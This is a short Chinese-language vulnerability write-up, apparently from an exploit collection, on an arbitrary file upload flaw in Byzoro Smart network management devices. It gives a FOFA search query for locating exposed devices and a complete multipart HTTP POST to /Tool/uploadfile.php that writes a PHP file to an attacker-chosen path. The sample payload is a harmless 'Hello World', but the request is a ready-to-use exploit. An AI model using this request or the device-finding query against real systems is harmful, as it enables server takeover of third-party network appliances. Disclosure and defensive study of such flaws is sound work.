# 百卓Smart uploadfile存在任意文件上传漏洞

# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。百卓Smart uploadfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征

![1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d.png](./img/5UAaScfollaesr-W/1699974927531-d5f2d49c-f9c3-417f-abc7-7bbcaba6f53d-768626.png)

# 四、漏洞复现
```plain
POST /Tool/uploadfile.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=942c6029711a902ca974ac33efcdb383
Content-Type: multipart/form-data; boundary=---------------------------13979701222747646634037182887
Content-Length: 409
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream

<?php echo '<p>Hello World</p>'; ?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"

/home/helloworld.php
-----------------------------13979701222747646634037182887--
```

![1708149333069-c16f5827-752d-439f-a499-b0552a57e972.png](./img/5UAaScfollaesr-W/1708149333069-c16f5827-752d-439f-a499-b0552a57e972-291266.png)

上传文件位置

```plain
/home/helloworld.php
```

![1708149358116-a65b5f1f-09ce-4959-bb49-51efe0944746.png](./img/5UAaScfollaesr-W/1708149358116-a65b5f1f-09ce-4959-bb49-51efe0944746-674187.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bpwixrcymsyfg62k>